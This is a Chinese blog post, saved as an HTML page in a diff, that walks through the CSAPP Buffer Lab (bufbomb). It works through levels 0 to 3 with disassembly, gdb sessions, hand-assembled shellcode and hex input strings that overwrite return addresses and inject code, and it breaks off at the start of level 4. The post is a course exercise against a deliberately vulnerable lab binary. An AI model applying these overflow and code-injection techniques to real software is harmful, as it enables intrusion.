@@ -1,0 +1,877 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="csapp," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="bufbomb是一个很有意思的，带有游戏性质的缓冲区溢出实验, 能够帮助你加深理解《Computer Systems A Programmer’s Perspective》书中第三章《Machine-Level Representation of Programs》中的内容。点 Self-Study Handout下载。或者，到下载地址找到Buffer Lab [Updated Sep 10, 2">
+<meta name="keywords" content="csapp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAPP实验bufbomb">
+<meta property="og:url" content="http://yoursite.com/2017/04/01/csapp实验bufbomb/index.html">
+<meta property="og:site_name" content="Yiyang&#39;s Blog">
+<meta property="og:description" content="bufbomb是一个很有意思的，带有游戏性质的缓冲区溢出实验, 能够帮助你加深理解《Computer Systems A Programmer’s Perspective》书中第三章《Machine-Level Representation of Programs》中的内容。点 Self-Study Handout下载。或者，到下载地址找到Buffer Lab [Updated Sep 10, 2">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-07-27T02:39:36.666Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CSAPP实验bufbomb">
+<meta name="twitter:description" content="bufbomb是一个很有意思的，带有游戏性质的缓冲区溢出实验, 能够帮助你加深理解《Computer Systems A Programmer’s Perspective》书中第三章《Machine-Level Representation of Programs》中的内容。点 Self-Study Handout下载。或者，到下载地址找到Buffer Lab [Updated Sep 10, 2">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/04/01/csapp实验bufbomb/"/>
+
+
+
+
+
+  <title>CSAPP实验bufbomb | Yiyang's Blog</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Yiyang's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/01/csapp实验bufbomb/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Yiyang Peng">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/7233064.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yiyang's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CSAPP实验bufbomb</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-01T10:06:00+08:00">
+                2017-04-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/操作/" itemprop="url" rel="index">
+                    <span itemprop="name">操作</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>bufbomb是一个很有意思的，带有游戏性质的缓冲区溢出实验, 能够帮助你加深理解《Computer Systems A Programmer’s Perspective》书中第三章《Machine-Level Representation of Programs》中的内容。<br>点 Self-Study Handout下载。<br>或者，到<a href="http://csapp.cs.cmu.edu/public/labs.html" target="_blank" rel="external">下载地址</a>找到Buffer Lab [Updated Sep 10, 2014] ( README, Writeup, Release Notes, Self-Study Handout )，点 Self-Study Handout下载。<br>解压命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar -xvf buflab-handout.tar</div></pre></td></tr></table></figure>
+<p>解压后阅读buflab.pdf了解实验内容。</p>
+<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><p>运行./bufbomb 会让你输入一些字符串，这些字符串将存储在一个临时变量字符数组中。这个字符数组没有进行边界检测，所以你可以输入任意长的字符串，直至覆盖这个数组边界之外的内存位置，根据我们输入的字符串的内容我们可以让程序做一些我们希望它作的事情，比如修改函数返回地址，让程序跳转到我们给它安排的位置去执行我们所写的代码。当然了，这里的代码不可能用C之类的高级语言写了，在执行过程中程序实际执行的是机器码，我们可以写一些汇编代码，然后转化为机器码，把这些机器码再转换成ASCII码字符串，当程序提示我们输入的时候，我们再将这些准备好的字符串输入给程序。这就等于我们把自己写的代码写入了程序，让它按我们的意愿执行。<br>这里要用到几个工具，objdump, gcc和gdb还有实验提供的一个将16进制数转化为ASCII码的工具hex2raw, 不知为什么我下了几个版本linux都无法执行hex2raw，无奈之下自己写了个简单版本的hex2raw,只能用文件输入输出，勉强代替原hex2raw的重定向功能，管道功能我就不管了。顺带一提，这个实验须用32位版本的linux才能运行，下载linux发行版时要注意是不是32位系统，反正我安装的64位ubuntu连./bufbomb都运行不了。<br>你在执行./bufbomb时要输入一个id，id是你任意指定的，每个id解法有所不同，我用的id是yy。bufbomb这个游戏有几个级别，每完成一级任务游戏就会升级，升级是对应一个id的，你想重玩一遍可以用另外一个id开始。</p>
+<h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>实验平台：Ubuntu 12.04 32bit<br>我们没有bufbomb的源代码，不知道程序里边的结构，只能利用反汇编工具objdump(苹果系统下没有objdump，可以用otool).指令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$objdump -t bufbomb &gt; buf_table  //输出bufbomb的符号表到文本文件buf_table</div><div class="line">$objdump -d bufbomb &gt; buf_asm    //输出bufbomb的汇编代码到文本文件buf_asm</div></pre></td></tr></table></figure>
+<p>我编写的hex2raw源代码本文末尾附录</p>
+<h1 id="Level-0"><a href="#Level-0" class="headerlink" title="Level 0"></a>Level 0</h1><p>bufbomb.pdf 告诉你它会在test()函数中调用getbuf()函数获取你的字符串，如果getbuf()函数执行完后返回到test()你就输了，你要做的是让getbuf()返回（跳转）到smoke()函数的开始处，让程序执行smoke()。<br>在buf_asm的getbuf()代码段中我们看到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">8048c0a: 8d 45 d8              lea    -0x28(%ebp),%eax</div><div class="line">8048c0d: 89 04 24              mov    %eax,(%esp)</div><div class="line">8048c10: e8 35 ff ff ff        call   8048b4a &lt;Gets&gt;</div></pre></td></tr></table></figure>
+<p>可知，我们输入的字符串的首地址-0x28(%ebp)，它会传给%eax，然后作为Gets的参数，Gets负责把我们输入的字符串放在-0x28(%ebp)开始的内存块里。熟悉函数调用栈结构的你应该知道，函数的返回地址在ebp的上边一个存储单元，从buf_asm可以看出，这个程序的虚拟地址空间是32位，即4个字节，故返回地址在+0x4(%ebp)这个位置，我们要在这个位置写入smoke()的开始地址，查找我们事先存在buf_table的符号表，得到smoke()对应的地址是0x080490ba</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">+0x4(%ebp)-(-0x28((%ebp)) = +0x4+%ebp-(-0x28+%ebp) = +0x4+0x28 = 0x2c = 40</div></pre></td></tr></table></figure>
+<p>因此我们输入的字符串要长40+4=44字节，前面的40个字节的字符帮助我们一路覆盖到返回地址之前，可以随便写，后边4个字节为我们指定的返回地址，即ba 90 04 08（0x080490ba的小端模式排列，即低位字节在前，高位字节在后），当程序执行完getbuf()后会跳转到这个地址去执行smoke()。</p>
+<p>因此我们可以输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 ba 90 04 08</div></pre></td></tr></table></figure>
+<p>我们可以在文件in0里写入上述十六进制数字，使用命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$./hex2raw in0 out0</div></pre></td></tr></table></figure>
+<p>（如果你从网站上下载下来的hex2raw可以执行，就用bufbomb.psf里提到的格式输入指令）将这些十六进制数字转换成ASCII码并保存到文件out0中<br>hex2raw会自动忽略文件里的空格和换行，不必担心排列问题。有些ASCII码不可打印，所以如果你cat out0可能看不到几个字符。<br>接着，我们运行bufbomb输入我们的字符，在终端输入指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$./bufbomb &lt; out0 -u yy</div></pre></td></tr></table></figure>
+<p>提示告诉我们</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Userid: yy</div><div class="line">Cookie: 0x2a50279f</div><div class="line">Type string:Smoke!: You called smoke() </div><div class="line">VAILD</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure>
+<p>通过了！</p>
+<h1 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h1><p>该级别的任务要求我们使bufbomb程序调用函数fizz()。<br>查找符号表的fizz()入口地址为0804906f. 我们可以用6f 90 04 08替换level0中输入的最后4个字节，实现跳转。但是，fizz()需要一个参数，当这个参数等于你的id对应的cookie时游戏才能顺利升级。使用指令(看实验指导，这个指令是实验材料给的)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$./makecookie yy</div></pre></td></tr></table></figure>
+<p>得到我的id,yy,对应的cookie为0x2a50279f。因此我们要将2a50279f写入fizz的参数所在的内存位置。<br>查看fizz的汇编代码有下列指令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">804906f: 55                     push   %ebp</div><div class="line">8049070: 89 e5                  mov    %esp,%ebp</div><div class="line">8049072: 83 ec 18               sub    $0x18,%esp</div><div class="line">8049075: 8b 45 08               mov    0x8(%ebp),%eax</div><div class="line">8049078: 3b 05 e4 c1 04 08      cmp    0x804c1e4,%eax</div><div class="line">804907e: 75 1e                  jne    804909e &lt;fizz+0x2f&gt;</div><div class="line">8049080: 89 44 24 04            mov    %eax,0x4(%esp)</div></pre></td></tr></table></figure>
+<p>有条比较指令 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cmp 0x804c1e4,%eax</div></pre></td></tr></table></figure>
+<p>比较寄存器eax和内存地址0x804c1e4的内容，查找符号表得知0x804c1e4存放的就是cookie,很明显我们的任务就是要使%eax里的内容等于0x2a50279f，由指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mov 0x8(%ebp),%eax</div></pre></td></tr></table></figure>
+<p>可知fizz()的参数位置在0x8(%ebp)，它把参数给%eax，再与cookie比较。fizz()的操作将会在getbuf()结束后执行，在查看bud_asm, getbuf()结尾有代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">leave        //等价于 mov %ebp,%esp; pop %ebp </div><div class="line">ret          //等价于 pop PC</div></pre></td></tr></table></figure>
+<p>可知栈顶指针寄存器%esp和帧指针寄存器%ebp已经回到bufbomb程序在调用getbuf()前的状态了。<br>由fizz的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mov %esp, %ebp</div></pre></td></tr></table></figure>
+<p>可知此时的%ebp是上一个栈test()栈的栈顶，<br>由于我们不是call fizz，而是直接jmp到fizz,因而程序没有自动push返回地址入栈，%esp也没有自动-4，因此上一个栈的栈顶%esp应该在上一题返回地址所在位置的上边一个存储单元。也就是说，fizz()中的%ebp的位置是上一题的0x4(%ebp)+4 = 0x8(%ebp)，我们只要比上一题再多写8个字节就可以覆盖到fizz的参数存放位置了。后4个字节为我们的cookie——9f 27 50 2a(注意是0x2a50279f的小端模式)，要输入的十六进制数字如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 ba 90 04 08 00 00</div><div class="line">00 00 9f 27 50 2a</div></pre></td></tr></table></figure>
+<p>把他们写入文本文件in1,输入命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$./hex2raw in1 out1</div><div class="line">$./bufbomb &lt; out1 -u yy</div></pre></td></tr></table></figure>
+<p>终端提示:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Userid: yy</div><div class="line">Cookie: 0x2a50279f</div><div class="line">Type string:Fizz!: You called fizz(0x2a50279f)</div><div class="line">VAILD</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure>
+<p>升到level2了！</p>
+<h1 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h1><p>该级的任务是要使程序跳转到bang(),bang的入口地址为0x08049022。在bang()中要比较全局变量global_value和cookie,只有当这个全局变量等于我们的cookie我们才能升级。因此我们的任务除了修改返回地址还要修改这个全局变量。<br>在符号表中查找global_value，得知它的存储地址为0x0804c1ec,并且我们有符号表得知它属于.bss段，属于未初始化的全局变量，在数据段中，基本处在该程序虚拟地址空间的底部，地址要远远小于我们能够通过输入字符串覆盖到的栈的区域，只能通过写入代码来修改。<br>在level0中，我们写入字符串的起始地址是-0x28(%ebp)，距离返回地址所在位置+0x4(%ebp)还有一段距离，我们可以把代码写在这个区间里。由代码来实现对global_value的修改和到bang()的跳转，然后再把返回地址改为我们写的代码的起始地址就行了。程序从getbuf返回后将跳到我们的代码，然后一句一句地执行我们的指令。<br>可是我们只知道字符串存放的相对位置-0x28(%ebp)，总不能把它写入返回地址里吧，而且在返回前我们什么也做不了，不能进行所需计算，只能通过gdb调试来得到字符存放的绝对地址了。注意getbuf有如下代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">8048c0a: 8d 45 d8             lea    -0x28(%ebp),%eax</div><div class="line">8048c0d: 89 04 24             mov    %eax,(%esp)</div><div class="line">8048c10: e8 35 ff ff ff       call   8048b4a &lt;Gets&gt;</div></pre></td></tr></table></figure>
+<p>可知0x8048c0d:中的%eax就存着字符串的首地址，也就是我们写入的代码的首地址。<br>打开gdb,在终端输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$gdb bufbomb</div><div class="line">(gdb) b *0x8048c0d       //在地址0x8048c0d设置断点</div><div class="line">(gdb) r xxxxxxx -u yy    //随便输入点字符让程序运行到断点位置</div><div class="line">(gdb) p /x $eax          //以十六进制数字形式打印%eax中的内容</div></pre></td></tr></table></figure>
+<p>我们得知 %eax = 0x55683ad8, 我们将以此作为getbuf()的返回地址（注意小端模式为d8 3a 68 55）。<br>下面用vi写我们的代码，文件名取.s结尾，我取作callbang.s，<br>终端输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vi callbang.s</div></pre></td></tr></table></figure>
+<p>进入vi, 输入代码为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mov 0x804c1e4, %eax      //把cookie赋给%eax</div><div class="line">mov %eax, 0x804c1ec      //把%eax中的cookie赋给global_value</div><div class="line">push $0x8049022          //bang()地址入栈</div><div class="line">ret                      //返回，跳到bang()</div></pre></td></tr></table></figure>
+<p>ret等效于pop PC,会让栈顶里的内容出栈，弹到程序计数器PC里，作为下一条要执行的指令。不要尝试使用call或者jmp $0x8049022，他俩事实上使用的是PC相对寻址，比较不容易设置正确。当然你也可以把0x8049022写到某个寄存器里，然后利用寄存器寻址跳到bang()。<br>在vi中输入:wq保存退出，回到终端。<br>有了代码，我们把它编译成目标文件，再用objdump -d 反汇编回来就能得到相应的机器码了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$gcc -m32 -c callbang.s</div><div class="line">$objdump -d callbang.o &gt; callbang_asm</div></pre></td></tr></table></figure>
+<p>打开callbang_asm看到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">callbang.o:     file format elf32-i386</div><div class="line">Disassembly of section .text:</div><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0: a1 e4 c1 04 08       mov    0x804c1e4,%eax</div><div class="line">   5: a3 ec c1 04 08       mov    %eax,0x804c1ec</div><div class="line">   a: 68 22 90 04 08       push   $0x8049022</div><div class="line">   f: c3                            ret</div></pre></td></tr></table></figure>
+<p>得到机器码为 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a1 e4 c1 04 08 a3 ec c1 04 08 68 22 90 04 08 c3</div></pre></td></tr></table></figure>
+<p>你不用管每条指令的机器码有多长，cpu会自己断句的，我们只需把这些机器码紧密地写在一起就行了。因此我们需要给hex2raw转换的十六进制数字为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">a1 e4 c1 04 08 a3 ec c1 04 08</div><div class="line">68 22 90 04 08 c3 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 d8 3a 68 55</div></pre></td></tr></table></figure>
+<p>将它们写入文本文件in2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$./hex2raw in2 out2</div><div class="line">$./bufbomb &lt; out2 -u yy</div></pre></td></tr></table></figure>
+<p>bufbomb输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Userid: yy</div><div class="line">Cookie: 0x2a50279f</div><div class="line">Type string:Bang!: You set global_value to 0x2a50279f</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure>
+<p>好的，又升级了！</p>
+<h1 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h1><p>这一级的任务是使getbuf()结束后返回到test(),并将你的cookie作为getbuf()的返回值传给test()。同时恢复各个寄存器的状态，使test()察觉不到我们干了什么，就好像我们什么都没做一样。<br>首先我们要知道要恢复哪个寄存器，每一级我们都要从-0x28(%ebp)这个位置一路覆盖到返回地址+0x4(%ebp)，显然0x0(%ebp)这个位置也被我们的字符串覆盖了。我们知道，%ebp是callee栈的基址，也就是当前函数的帧指针；(%ebp)是这个基址位置里的内容，也是一个指针，指向caller栈的基址，即调用者的帧指针，在这里是test()的帧指针。当getbuf()返回时试图把(%ebp)恢复到%ebp，但(%ebp)里是我们输入的字符串，我们需要把test()的%ebp里的值找出来，再利用我们写入的指令把它重新赋给%ebp. 要找到原%ebp的值，这需要使用gdb,在test()的代码处设置断点，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$gdb bufbomb</div><div class="line">(gdb) b *0x8048c8b  (0x8048c8b是test()中call getbuf下一句的地址)</div><div class="line">Breakpoint 1 at 0x8048c8b</div><div class="line">(gdb) r xxxx -u yy</div><div class="line">Starting program: /media/psf/Home/Documents/csapplabs/3-buflab/bufbomb xxxx -u yy</div><div class="line">Userid: yy</div><div class="line">Cookie: 0x2a50279f</div><div class="line">Breakpoint 1, 0x08048c8b in test ()</div><div class="line">(gdb) p /x $ebp</div><div class="line">$1 = 0x55683b30</div></pre></td></tr></table></figure>
+<p>由此我们知道了test()中的ebp了.<br>接着，在buf_asm中查看test的汇编代码，有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">8048c8e: e8 71 ff ff ff       call   8048c04 &lt;getbuf&gt;</div><div class="line">8048c93: 89 c3                mov    %eax,%ebx</div></pre></td></tr></table></figure>
+<p>得知getbuf()正确的返回地址为0x8048c93,我们还是用level2中push-ret的方法跳回test.可以着手写代码了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mov $0x2a50279f,%eax             //把我们的cookie值赋给%eax</div><div class="line">mov $0x55683b30,%ebp             //恢复test()的%ebp</div><div class="line">push $0x8048c93                  //推立即数0x8048c93入栈</div><div class="line">ret</div></pre></td></tr></table></figure>
+<p>保存为rettest.s</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$gcc -m32 -c rettest.s</div><div class="line">$objdump -d rettest.o &gt; rettest_asm</div></pre></td></tr></table></figure>
+<p>查看rettest_asm得到我们的机器码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">rettest.o:     file format elf32-i386</div><div class="line">Disassembly of section .text:</div><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0: b8 9f 27 50 2a         mov    $0x2a50279f,%eax</div><div class="line">   5: bd 30 3b 68 55         mov    $0x55683b30,%ebp</div><div class="line">   a: 68 93 8c 04 08         push   $0x8048c93</div><div class="line">   f: c3                              ret</div></pre></td></tr></table></figure>
+<p>把这些十六进制机器码写入文件in3</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">b8 9f 27 50 2a bd 30 3b 68 55</div><div class="line">68 93 8c 04 08 c3 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 d8 3a 68 55</div></pre></td></tr></table></figure>
+<p>剩下的步骤照旧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$./hex2raw in3 out3</div><div class="line">$./bufbomb &lt; out3 -u yy</div></pre></td></tr></table></figure>
+<p>结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Userid: yy</div><div class="line">Cookie: 0x2a50279f</div><div class="line">Type string:Boom!: getbuf returned 0x2a50279f</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure>
+<h1 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h1><p>本级要使用./bufbomb的-n参数，bufbomb不会再像从前哪样调用test()，而是调用testn()，testn()又调用getbufn().本级的任务是使getn返回cookie给testn()。听上去似乎与上一级没什么不同，但实际上该级的栈地址是动态的，每次都不一样，bufbomb会连续要我们输入5次字符串，每次都调用getbufn(),每次的栈地址都不一样，我么将不能再使用原来用gdb调试的方法来求%ebp的地址了。<br>bufbomb在5次调用testn()和getbufn()的过程中，两个函数的栈是连续的，在testn()汇编代码开头有</p>
